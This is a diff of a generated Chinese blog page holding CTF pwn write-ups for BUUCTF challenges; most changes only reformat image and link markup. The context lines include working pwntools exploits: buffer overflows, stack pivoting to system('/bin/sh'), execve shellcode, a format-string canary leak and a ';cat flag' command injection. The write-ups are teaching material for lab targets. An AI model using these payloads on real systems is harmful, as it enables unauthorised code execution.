@@ -311,7 +311,7 @@
 
         <div class="statistics flex justify-around my-2.5">
     <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/tags">
-        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">5</div>
+        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">6</div>
         <div class="label text-third-text-color text-sm">标签</div>
     </a>
     <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/categories">
@@ -319,7 +319,7 @@
         <div class="label text-third-text-color text-sm">分类</div>
     </a>
     <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/archives">
-        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">5</div>
+        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">6</div>
         <div class="label text-third-text-color text-sm">文章</div>
     </a>
 </div>
@@ -418,7 +418,7 @@
 <p><em>有人说我的前面的题解没解析，看不懂？那我来补上了</em></p>
 <h2 id="1-test-nc"><a href="#1-test-nc" class="headerlink" title="1 test_nc"></a>1 test_nc</h2><p><code>nc 节点 端口</code></p>
 <blockquote>
-<p>没有nc？去看<a class="link" target="_blank" rel="noopener" href="https://ctf-wiki.org/pwn/linux/user-mode/environment/">这篇！<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
+<p>没有nc？去看<a class="link"   target="_blank" rel="noopener" href="https://ctf-wiki.org/pwn/linux/user-mode/environment/" >这篇！<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
 </blockquote>
 <p>然后<code>cat flag</code></p>
 <ul>
@@ -440,7 +440,12 @@
 
 <p>在本地打了半天以为我有问题，最后想起来system执行的是cat flag，不会有shell</p>
 <h2 id="4-ciscn-2019-n-1"><a href="#4-ciscn-2019-n-1" class="headerlink" title="4 ciscn_2019_n_1"></a>4 ciscn_2019_n_1</h2><p>看下ida逆出来的代码</p>
-<p><img lazyload src="/images/loading.svg" data-src="/images/image-20250222233345553.png" alt="image-20250222233345553"></p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/image-20250222233345553.png"
+                      alt="image-20250222233345553"
+                ></p>
 <p>发现想要获取flag的内容，需要<code>v2=11.28125</code>,但是，我们一定要让if执行嘛，一定要合程序的意嘛，都打pwn了，怎么可以顺着程序的意来呢</p>
 <p>所以有两种思路，一种是覆盖返回地址，一种是覆盖v2</p>
 <ol>
@@ -455,10 +460,20 @@
 <p>可以看到我们的输入是在v2赋值之后的事，所以可以通过溢出来把v2的值给覆盖了，<code>0x2c = 0x30-0x4</code></p>
 <blockquote>
 <p>不知道为什么填充的是<code>0x4138000</code>?学一下浮点数的存储叭，或者，按下tab，对准那个黄色的地方双击（如果不是这样子的话按下空格）</p>
-<img lazyload src="/images/loading.svg" data-src="/images/image-20250222234229981.png" alt="image-20250222234229981" style="zoom: 50%;">
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/image-20250222234229981.png"
+                      alt="image-20250222234229981" style="zoom: 50%;" 
+                >
 
 <p>你就得到了11.28125的十六进制存储</p>
-<p><img lazyload src="/images/loading.svg" data-src="/images/image-20250222234041347.png" alt="image-20250222234041347"></p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/image-20250222234041347.png"
+                      alt="image-20250222234041347"
+                ></p>
 </blockquote>
 </li>
 </ol>
@@ -619,7 +634,7 @@
 <div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> LibcSearcher</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>,log_level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">context.terminal = <span class="string">&#x27;wt.exe -d . wsl.exe -d Ubuntu&#x27;</span>.split()</span><br><span class="line">elf = ELF(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line"><span class="comment">#libc = ELF(&quot;./libc.so.6&quot;)</span></span><br><span class="line"><span class="comment">#p = process(&#x27;./pwn&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;node5.buuoj.cn&#x27;</span>,<span class="number">28402</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dbg</span>():</span><br><span class="line">    gdb.attach(p)</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x88</span>+p64(<span class="number">0x400620</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;:&#x27;</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></div>
 
 <h2 id="26-ciscn-2019-es-2"><a href="#26-ciscn-2019-es-2" class="headerlink" title="26 ciscn_2019_es_2"></a>26 ciscn_2019_es_2</h2><p>发现溢出只有八字节，需要栈迁移</p>
-<p>我觉得这位师傅讲的不错，<a class="link" target="_blank" rel="noopener" href="https://bbs.kanxue.com/thread-269163.htm">ciscn_2019_es_2<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
+<p>我觉得这位师傅讲的不错，<a class="link"   target="_blank" rel="noopener" href="https://bbs.kanxue.com/thread-269163.htm" >ciscn_2019_es_2<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
 <div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> * </span><br><span class="line">context.terminal = [<span class="string">&#x27;terminator&#x27;</span>,<span class="string">&#x27;-x&#x27;</span>,<span class="string">&#x27;sh&#x27;</span>,<span class="string">&#x27;-c&#x27;</span>]</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">p=remote(<span class="string">&#x27;node5.buuoj.cn&#x27;</span>,<span class="number">25052</span>)</span><br><span class="line"><span class="comment">#p=process(&quot;./pwn&quot;)</span></span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">sys_addr=elf.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">leave_ret=<span class="number">0x080484b8</span></span><br><span class="line">p.recvuntil(<span class="string">&quot;name?\n&quot;</span>)</span><br><span class="line">payload1= <span class="number">0x20</span>*<span class="string">&quot;a&quot;</span>+<span class="string">&quot;b&quot;</span>*<span class="number">0x8</span></span><br><span class="line">p.send(payload1)</span><br><span class="line">p.recvuntil(<span class="string">&quot;b&quot;</span>*<span class="number">0x8</span>)</span><br><span class="line">ebp_addr=u32(p.recv(<span class="number">4</span>))</span><br><span class="line"></span><br><span class="line">log.info(<span class="string">&#x27;ebp:&#x27;</span>+<span class="built_in">hex</span>(ebp_addr))</span><br><span class="line"></span><br><span class="line">payload2 = (<span class="string">b&quot;aaaa&quot;</span>+p32(sys_addr)+<span class="string">b&#x27;aaaa&#x27;</span>+p32(ebp_addr-<span class="number">0x28</span>)+<span class="string">b&#x27;/bin/sh&#x27;</span>).ljust(<span class="number">0x28</span>,<span class="string">b&#x27;\x00&#x27;</span>)+p32(ebp_addr-<span class="number">0x38</span>) + p32(leave_ret)</span><br><span class="line">p.send(payload2)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></div>
 
 <h3 id="栈迁移"><a href="#栈迁移" class="headerlink" title="栈迁移"></a>栈迁移</h3><p><code>vul</code>函数看一下</p>
@@ -757,9 +772,19 @@
 
 <p>保护全关，有可读可写可执行段，可能是<code>shellcode</code></p>
 <p>看下题目</p>
-<p><img lazyload src="/images/loading.svg" data-src="/images/image-20250131225811634.png" alt="image-20250131225811634"></p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/image-20250131225811634.png"
+                      alt="image-20250131225811634"
+                ></p>
 <p><code>memchr</code>函数在网上搜索一下就好，这里不做详细介绍，主要是看到最后有一个比较，如果在<code>\n</code>之前为<code>crasheme</code>，则可以进入vuln函数</p>
-<p><img lazyload src="/images/loading.svg" data-src="/images/image-20250131230108221.png" alt="image-20250131230108221"></p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/image-20250131230108221.png"
+                      alt="image-20250131230108221"
+                ></p>
 <p>明显的溢出漏洞，<code>dest</code>仅有0x32字节，但是可以读入0x400字节，往里面写入shellcode</p>
 <p><strong>思路</strong></p>
 <p>往s里写入shllcode，执行vuln函数后让dest溢出，将返回地址修改为shellcode的地址</p>
@@ -773,10 +798,20 @@
 <div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.terminal = <span class="string">&#x27;wt.exe -d . wsl.exe -d Ubuntu&#x27;</span>.split()</span><br><span class="line">p=process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">gdb.attach(p,<span class="string">&#x27;b *0x8048600&#x27;</span>)<span class="comment">#利用gdb动调，在0x8048600处下了个断点</span></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;crash: &#x27;</span>)</span><br><span class="line">stack=<span class="built_in">int</span>(p.recv(<span class="number">10</span>),<span class="number">16</span>)</span><br><span class="line"><span class="built_in">print</span> (<span class="built_in">hex</span>(stack))</span><br><span class="line"></span><br><span class="line">payload=<span class="string">&#x27;crashme\x00&#x27;</span>+<span class="string">&#x27;aaaaaa&#x27;</span><span class="comment">#前面的crashme\x00绕过if判断</span></span><br><span class="line">      <span class="comment">#后面的aaaa是测试数据，随便输入的，我们等等去栈上找它的地址</span></span><br><span class="line"></span><br><span class="line">pause()</span><br><span class="line">p.sendline(payload)</span><br><span class="line">pause()</span><br></pre></td></tr></table></figure></div>
 
 <p><code>0x8048600</code>是一个<code>nop</code>指令的地址，在这里下一个断点，方便调试</p>
-<p><img lazyload src="/images/loading.svg" data-src="/images/image-20250131231137749.png" alt="image-20250131231137749"></p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/image-20250131231137749.png"
+                      alt="image-20250131231137749"
+                ></p>
 <p><em>这里输入地址的结尾是abc</em></p>
 <p>按c执行下一步，然后输入<code>stack 50</code>看一下栈布局</p>
-<p><img lazyload src="/images/loading.svg" data-src="/images/image-20250131233050407.png" alt="image-20250131233050407"></p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/image-20250131233050407.png"
+                      alt="image-20250131233050407"
+                ></p>
 <p><strong>解决一下shellcode在栈上的位置（填充多少数据合适）</strong></p>
 <p>可以看到我们输入的crashme有一部分在距离<code>esp</code>0x24处，因为没有对齐的原因，cr在上面一行，对应0x63 0x72(小端序)</p>
 <p>然后ebp在0x38处，我们输入的参数0x22处（虽然左边标的是0x20，但是有两个字节不是我们输入的，真正输入的是0x72 0x63)，所以ebp距离我们输入点的距离是<code>0x38-0x22=0x16</code>，而shellcode是写在ebp后面的，也就是<code>0x16+0x4</code>的地方</p>
@@ -802,7 +837,12 @@
 <div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> LibcSearcher</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>,log_level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">context.terminal = <span class="string">&#x27;wt.exe -d . wsl.exe -d Ubuntu&#x27;</span>.split()</span><br><span class="line">elf = ELF(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line"><span class="comment">#libc = ELF(&quot;./libc.so.6&quot;)</span></span><br><span class="line"><span class="comment">#p = process(&#x27;./pwn&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;node5.buuoj.cn&#x27;</span>,<span class="number">26947</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dbg</span>():</span><br><span class="line">    gdb.attach(p)</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line">shellcode = asm(shellcraft.sh())</span><br><span class="line">p.sendline(shellcode)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></div>
 
 <p>接下来看一下汇编</p>
-<p><img lazyload src="/images/loading.svg" data-src="/images/image-20250201215315053.png" alt="image-20250201215315053"></p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/image-20250201215315053.png"
+                      alt="image-20250201215315053"
+                ></p>
 <div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">buf= byte ptr -410h	;buf 表示相对于基指针 rbp 偏移量为 -410h 的一个字节内存位置</span><br><span class="line">var_4= dword ptr -4	;var_4 表示相对于基指针 rbp 偏移量为 -4 的一个双字（32 位，4 字节）内存位置</span><br></pre></td></tr></table></figure></div>
 
 <div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">push    rbp</span><br><span class="line">mov     rbp, rsp</span><br><span class="line">sub     rsp, 410h</span><br></pre></td></tr></table></figure></div>
@@ -861,7 +901,12 @@
 </li>
 <li><p>ida看一下，直接去<code>gift()</code>函数</p>
 <ul>
-<li><p><img lazyload src="/images/loading.svg" data-src="/images/image-20250201232816600.png" alt="image-20250201232816600"></p>
+<li><p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/image-20250201232816600.png"
+                      alt="image-20250201232816600"
+                ></p>
 </li>
 <li><p>v2就是canary值（一会后面解释canary保护），距离rbp为<code>0x-8</code></p>
 </li>
@@ -872,7 +917,12 @@
 <li><p>接下来动态调试一下看看canary的值是哪个（不出意外就是后一个）</p>
 <ul>
 <li>在printf处下断点，然后run运行到断点处，输入aa，然后查看栈结构</li>
-<li><img lazyload src="/images/loading.svg" data-src="/images/image-20250201233714092.png" alt="image-20250201233714092"></li>
+<li><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/image-20250201233714092.png"
+                      alt="image-20250201233714092"
+                ></li>
 <li>canary值（v2)在rbp-8处，而我们输入的aa在它的上面，所以canary值可以用<code>%7$p</code>打印出来</li>
 </ul>
 </li>
@@ -886,7 +936,12 @@
 <p><em>后面3就是正常的ret2libc了，都写烂了要，不说了</em></p>
 <h2 id="37-babyheap-0ctf-2017"><a href="#37-babyheap-0ctf-2017" class="headerlink" title="37 babyheap_0ctf_2017"></a>37 babyheap_0ctf_2017</h2><p>施工施工，heap先等等</p>
 <h2 id="38-bjdctf-2020-router"><a href="#38-bjdctf-2020-router" class="headerlink" title="38 bjdctf_2020_router"></a>38 bjdctf_2020_router</h2><p>考察linux下的命令机制</p>
-<h4 id="命令一；命令二这样的格式会执行两种指令"><a href="#命令一；命令二这样的格式会执行两种指令" class="headerlink" title="命令一；命令二这样的格式会执行两种指令"></a><code>命令一；命令二</code>这样的格式会执行两种指令</h4><p><img lazyload src="/images/loading.svg" data-src="/images/image-20250202230419710.png" alt="image-20250202230419710"></p>
+<h4 id="命令一；命令二这样的格式会执行两种指令"><a href="#命令一；命令二这样的格式会执行两种指令" class="headerlink" title="命令一；命令二这样的格式会执行两种指令"></a><code>命令一；命令二</code>这样的格式会执行两种指令</h4><p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/image-20250202230419710.png"
+                      alt="image-20250202230419710"
+                ></p>
 <p>ida里面一看，<code>system(dest)</code>,前面还有一段将<code>buf</code>拼接到dest后面，那直接输入<code>;cat flag</code>秒了，exp都不用。直接nc</p>
 <h2 id="39-inndy-rop"><a href="#39-inndy-rop" class="headerlink" title="39 inndy_rop"></a>39 inndy_rop</h2><p><strong>rop一把梭</strong>*</p>
 <p>打开ida一看，这么多函数，这么明显的溢出，直接ropchain一把梭</p>
@@ -917,7 +972,7 @@
 
 <h3 id="分析分析"><a href="#分析分析" class="headerlink" title="分析分析"></a>分析分析</h3><p>这种纯手工构造ROP还是可以分析分析的</p>
 <ul>
-<li><p>首先是系统调用的知识，可以看<a class="link" target="_blank" rel="noopener" href="https://blog.csdn.net/xiaominthere/article/details/17287965">这里<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
+<li><p>首先是系统调用的知识，可以看<a class="link"   target="_blank" rel="noopener" href="https://blog.csdn.net/xiaominthere/article/details/17287965" >这里<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
 <ul>
 <li>省流一下：<code>int 0x80</code>就是系统调用（syscall），然后根据<code>syscall(n)</code>中n的值执行不同函数，其中<code>0xb</code>可以执行<code>execve</code>函数</li>
 </ul>
@@ -925,7 +980,12 @@
 <li><p>接下来构造ROP</p>
 <ul>
 <li><p>先是溢出覆盖，这里ida显示的不对，动态调试可以发现实际的偏移是0x1c</p>
-<p><img lazyload src="/images/loading.svg" data-src="/./../polarD&N/images/image-20250204214033910.png" alt="image-20250204214033910"></p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/./../polarD&N/images/image-20250204214033910.png"
+                      alt="image-20250204214033910"
+                ></p>
 <blockquote>
 <p>我们输入的相对位置是0x24,ebp的相对位置是0x40，实际偏移<code>0x40-0x24=0x1c</code></p>
 </blockquote>
@@ -958,7 +1018,12 @@
 
 <h2 id="51-bbys-tu-2016"><a href="#51-bbys-tu-2016" class="headerlink" title="51 bbys_tu_2016"></a>51 bbys_tu_2016</h2><p><em><strong>ret2text</strong></em></p>
 <p>ida里面的偏移有问题，需要动态调试看看</p>
-<p><img lazyload src="/images/loading.svg" data-src="/images/image-20250206135324577.png" alt="image-20250206135324577"></p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/image-20250206135324577.png"
+                      alt="image-20250206135324577"
+                ></p>
 <p>这里<code>-14</code>，说明偏移为14</p>
 <div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> LibcSearcher</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>,log_level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">context.terminal = <span class="string">&#x27;wt.exe -d . wsl.exe -d Ubuntu&#x27;</span>.split()</span><br><span class="line">elf = ELF(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line"><span class="comment">#p = process(&#x27;./pwn&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;node5.buuoj.cn&#x27;</span>,<span class="number">25770</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"></span><br><span class="line">flag_addr = <span class="number">0x804856D</span></span><br><span class="line">payload = <span class="string">b&#x27;b&#x27;</span>*<span class="number">0x18</span>+p32(flag_addr)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></div>
 
@@ -983,7 +1048,12 @@
 <h3 id="动态调试分析"><a href="#动态调试分析" class="headerlink" title="动态调试分析"></a>动态调试分析</h3><ul>
 <li><p>先看下新栈的地址为什么是<code>ebp-0x38</code></p>
 <ul>
-<li><img lazyload src="/images/loading.svg" data-src="/images/image-20250210000514934.png" alt="image-20250210000514934"></li>
+<li><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/image-20250210000514934.png"
+                      alt="image-20250210000514934"
+                ></li>
 <li>这里是寄存器的地址，可以看到我们的字符串输入到了<code>760</code>处、而<code>ebp</code>指向了<code>798</code>处，相差<code>0x3</code>8字节，所以将栈迁移到这里，方便执行我们的输入</li>
 </ul>
 </li>
@@ -1040,20 +1110,40 @@
 <div class="code-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">❯ checksec pwn</span><br><span class="line">[*] &#x27;/home/pwn/pwn/buuctf/55/pwn&#x27;</span><br><span class="line">    Arch:       amd64-64-little</span><br><span class="line">    RELRO:      Partial RELRO</span><br><span class="line">    Stack:      Canary found</span><br><span class="line">    NX:         NX enabled</span><br><span class="line">    PIE:        No PIE (0x400000)</span><br><span class="line">    Stripped:   No</span><br></pre></td></tr></table></figure></div>
 
 <p>ida查看</p>
-<img lazyload src="/images/loading.svg" data-src="/images/image-20250216001902396.png" alt="image-20250216001902396" style="zoom:80%;">
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/image-20250216001902396.png"
+                      alt="image-20250216001902396" style="zoom:80%;" 
+                >
 
 <p>在第14和16行发现要输入的账号和密码，不过肯定没有这么简单，执行看看</p>
 <div class="code-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">❯ ./pwn</span><br><span class="line"> _____   _  ____ _____ _____   _                _</span><br><span class="line">|__  /  | |/ ___|_   _|  ___| | |    ___   __ _(_)_ __</span><br><span class="line">  / /_  | | |     | | | |_    | |   / _ \ / _` | | &#x27;_ \</span><br><span class="line"> / /| |_| | |___  | | |  _|   | |__| (_) | (_| | | | | |</span><br><span class="line">/____\___/ \____| |_| |_|     |_____\___/ \__, |_|_| |_|</span><br><span class="line">                                          |___/</span><br><span class="line">Please enter username: admin</span><br><span class="line">Please enter password: 2jctf_pa5sw0rd</span><br><span class="line">Password accepted: Password accepted:</span><br><span class="line"></span><br><span class="line">[1]    4014 segmentation fault  ./pwn</span><br></pre></td></tr></table></figure></div>
 
 <p>&#x3D;&#x3D;寄&#x3D;&#x3D;</p>
 <p>看别人的汇编发现在<code>password_checker</code>函数中有一个隐蔽的错误</p>
-<img lazyload src="/images/loading.svg" data-src="/images/image-20250216002126070.png" alt="image-20250216002126070" style="zoom: 80%;">
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/image-20250216002126070.png"
+                      alt="image-20250216002126070" style="zoom: 80%;" 
+                >
 
 <p>主可以看到在<code>0x400A54</code>位置处有一个<code>call rax</code>指令，那么我们将rax修改为后门函数的地址就可以了（默认你找到那个后门函数了）</p>
-<img lazyload src="/images/loading.svg" data-src="/images/image-20250216002324164.png" alt="image-20250216002324164" style="zoom:80%;">
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/image-20250216002324164.png"
+                      alt="image-20250216002324164" style="zoom:80%;" 
+                >
 
 <p>可以在<code>0x400A89</code>位置处发现rax的值由<code>var_18</code>确定，那么去找一下<code>var_18</code>在哪里</p>
-<img lazyload src="/images/loading.svg" data-src="/images/image-20250216002503305.png" alt="image-20250216002503305" style="zoom:80%;">
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/image-20250216002503305.png"
+                      alt="image-20250216002503305" style="zoom:80%;" 
+                >
 
 <p>有的，兄弟，有的…</p>
 <p>从<code>s</code>处（ebp-0x60)开始，到<code>var_18</code>(ebp-0x18),再除去已经输入的密码<code>2jctf_pa5sw0rd\x00</code>(0xe长度),我们需要填充的数据量为<code>0x60 - 0x18 - 0xe = 0x3a</code></p>
@@ -1082,7 +1172,12 @@
 
 <h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><div class="code-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">❯ checksec pwn</span><br><span class="line">[*] &#x27;/home/pwn/pwn/buuctf/59/pwn&#x27;</span><br><span class="line">    Arch:       i386-32-little</span><br><span class="line">    RELRO:      Partial RELRO</span><br><span class="line">    Stack:      No canary found</span><br><span class="line">    NX:         NX enabled</span><br><span class="line">    PIE:        No PIE (0x8048000)</span><br><span class="line">    Stripped:   No</span><br></pre></td></tr></table></figure></div>
 
-<p><img lazyload src="/images/loading.svg" data-src="/images/image-20250216163343339.png" alt="image-20250216163343339"></p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/image-20250216163343339.png"
+                      alt="image-20250216163343339"
+                ></p>
 <p>在第25行有明显<code>fmt漏洞</code>,经过输入查询发现我们的输入偏移为8（但不完全是）</p>
 <blockquote>
 <p>gdb测试的时候发现第一个字符的输入是存放在了第7个偏移处，所以应该先填充一个字符，防止后来的地址出现问题</p>
@@ -1129,8 +1224,8 @@
 <p>所以我们可以先给esp指的位置泄露出来，然后把那个地方写入shellcode并执行</p>
 <div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.arch = <span class="string">&#x27;i386&#x27;</span></span><br><span class="line"><span class="comment">#p = process(&#x27;./pwn&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;node5.buuoj.cn&#x27;</span>,<span class="number">25719</span>)</span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">20</span>+p32(<span class="number">0x08048087</span>)<span class="comment"># ida里可以看到，这里对应的是	mov		ecx,esp</span></span><br><span class="line">p.recvuntil(<span class="string">b&#x27;:&#x27;</span>)</span><br><span class="line">p.send(payload)</span><br><span class="line">leak = u32(p.recv(<span class="number">4</span>))</span><br><span class="line">shellcode = <span class="string">b&#x27;\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80&#x27;</span></span><br><span class="line"><span class="comment">#shellcode = asm(shellcraft.sh())</span></span><br><span class="line">payload2 = <span class="string">b&#x27;a&#x27;</span>*<span class="number">20</span>+p32(leak+<span class="number">20</span>)+shellcode</span><br><span class="line">p.send(payload2)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></div>
 
-<p>可以在<a class="link" target="_blank" rel="noopener" href="http://shell-storm.org/shellcode/index.html">这里<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>找一些合适的shellcode</p>
